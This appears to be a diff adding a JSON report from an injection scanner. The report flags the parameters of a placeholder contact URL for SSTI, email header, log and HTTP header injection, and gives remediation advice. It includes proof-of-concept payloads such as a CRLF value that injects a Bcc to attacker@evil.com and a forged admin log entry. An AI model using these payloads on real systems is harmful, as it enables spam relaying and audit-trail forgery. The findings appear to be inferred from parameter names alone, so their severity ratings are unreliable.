@@ -1,0 +1,143 @@
+﻿{
+    "disclaimer":  "This is a heuristic/structural analysis for educational purposes only. No real requests were made to the target.",
+    "targetUrl":  "https://app.test/contact?to=admin@site.com\u0026subject=test\u0026log=event\u0026ua=Mozilla",
+    "scanTimestamp":  "2026-07-22T07:12:02.316Z",
+    "parameters":  [
+                       "to",
+                       "subject",
+                       "log",
+                       "ua"
+                   ],
+    "paramValues":  {
+                        "to":  "admin@site.com",
+                        "subject":  "test",
+                        "log":  "event",
+                        "ua":  "Mozilla"
+                    },
+    "pathSegments":  [
+                         "contact"
+                     ],
+    "domain":  "app.test",
+    "techStackClues":  [
+
+                       ],
+    "potentialInjectionPoints":  [
+                                     {
+                                         "type":  "Query Parameter",
+                                         "location":  "?to=admin@site.com",
+                                         "risk":  "Medium",
+                                         "reason":  "Parameter \"to\" is a user-controlled input point"
+                                     },
+                                     {
+                                         "type":  "Query Parameter",
+                                         "location":  "?subject=test",
+                                         "risk":  "Medium",
+                                         "reason":  "Parameter \"subject\" is a user-controlled input point"
+                                     },
+                                     {
+                                         "type":  "Query Parameter",
+                                         "location":  "?log=event",
+                                         "risk":  "Medium",
+                                         "reason":  "Parameter \"log\" is a user-controlled input point"
+                                     },
+                                     {
+                                         "type":  "Query Parameter",
+                                         "location":  "?ua=Mozilla",
+                                         "risk":  "Medium",
+                                         "reason":  "Parameter \"ua\" is a user-controlled input point"
+                                     },
+                                     {
+                                         "type":  "HTTP Headers",
+                                         "location":  "Request Headers (User-Agent, Referer, Cookie, Host, etc.)",
+                                         "risk":  "Medium",
+                                         "reason":  "HTTP headers are often logged or reflected without sanitization"
+                                     }
+                                 ],
+    "findings":  [
+                     {
+                         "type":  "Server-Side Template Injection (SSTI)",
+                         "injectionFamily":  "Server-Side / Code Execution",
+                         "location":  "Query parameter: subject (value=\"test\")",
+                         "parameter":  "subject",
+                         "paramValue":  "test",
+                         "severity":  "Critical",
+                         "confidence":  "Likely",
+                         "cvss":  9.8,
+                         "cwe":  "CWE-94",
+                         "owasp":  "A03:2021",
+                         "description":  "Template/view parameters rendered by Jinja2, Twig, Velocity, or similar engines can execute arbitrary code when `{{7*7}}` returns 49. SSTI leads directly to Remote Code Execution.",
+                         "evidence":  "Parameter \"subject\"=\"test\" detected — cmdi-ssti",
+                         "pocPayload":  "{{7*7}} or ${7*7} or #{7*7}",
+                         "recommendation":  "Never pass user input to template render functions. Use sandboxed template environments. Validate and sanitize before rendering."
+                     },
+                     {
+                         "type":  "Email Header Injection",
+                         "injectionFamily":  "Protocol / Header / Log / AI Injection",
+                         "location":  "Query parameter: to (value=\"admin@site.com\")",
+                         "parameter":  "to",
+                         "paramValue":  "admin@site.com",
+                         "severity":  "High",
+                         "confidence":  "Likely",
+                         "cvss":  7.5,
+                         "cwe":  "CWE-93",
+                         "owasp":  "A03:2021",
+                         "description":  "Email address or subject parameters injected with CRLF sequences allow attackers to add BCC/CC recipients, modify headers, and use the application as a spam relay or spear-phishing platform.",
+                         "evidence":  "Parameter \"to\"=\"admin@site.com\" detected — email-header-injection",
+                         "pocPayload":  "victim@example.com%0aBcc:attacker@evil.com",
+                         "recommendation":  "Reject CRLF characters in email fields. Use a dedicated email library that handles escaping. Validate email format strictly with RFC 5321 patterns."
+                     },
+                     {
+                         "type":  "Log Injection / Log Forging",
+                         "injectionFamily":  "Protocol / Header / Log / AI Injection",
+                         "location":  "Query parameter: log (value=\"event\")",
+                         "parameter":  "log",
+                         "paramValue":  "event",
+                         "severity":  "Medium",
+                         "confidence":  "Likely",
+                         "cvss":  5.4,
+                         "cwe":  "CWE-117",
+                         "owasp":  "A09:2021",
+                         "description":  "Log-related parameters written directly to log files enable Log Injection — attackers insert fake log entries to cover tracks, confuse security analysts, or forge audit trails.",
+                         "evidence":  "Parameter \"log\"=\"event\" detected — log-injection",
+                         "pocPayload":  "normal%0a[FAKE ADMIN] User admin logged in successfully",
+                         "recommendation":  "Sanitize all logged values. Use structured logging (JSON). Encode newlines in log output. Apply SIEM correlation rules to detect log anomalies."
+                     },
+                     {
+                         "type":  "HTTP Header Injection",
+                         "injectionFamily":  "Protocol / Header / Log / AI Injection",
+                         "location":  "Query parameter: ua (value=\"Mozilla\")",
+                         "parameter":  "ua",
+                         "paramValue":  "Mozilla",
+                         "severity":  "Medium",
+                         "confidence":  "Likely",
+                         "cvss":  5.4,
+                         "cwe":  "CWE-113",
+                         "owasp":  "A03:2021",
+                         "description":  "User-Agent, Referer, or other HTTP headers logged or reflected without CRLF sanitization allow header injection — attackers split HTTP responses or inject fake log entries.",
+                         "evidence":  "Parameter \"ua\"=\"Mozilla\" detected — http-header-injection",
+                         "pocPayload":  "Mozilla/5.0%0d%0aInjected-Header: malicious",
+                         "recommendation":  "Sanitize all HTTP headers before logging or reflecting. Strip \\r\\n sequences. Use structured logging that automatically escapes special characters."
+                     }
+                 ],
+    "summary":  {
+                    "totalPages":  1,
+                    "injectionPoints":  4,
+                    "parameters":  4,
+                    "riskScore":  7,
+                    "highestSeverity":  "Critical",
+                    "owaspCoverage":  [
+                                          "A03:2021",
+                                          "A09:2021"
+                                      ],
+                    "familiesTested":  [
+                                           "SQL/NoSQL Injection",
+                                           "Client-Side / XSS",
+                                           "Server-Side / Code Execution",
+                                           "Protocol / Header / Log / AI Injection"
+                                       ],
+                    "injectionFamilyCounts":  {
+                                                  "Server-Side / Code Execution":  1,
+                                                  "Protocol / Header / Log / AI Injection":  3
+                                              }
+                }
+}
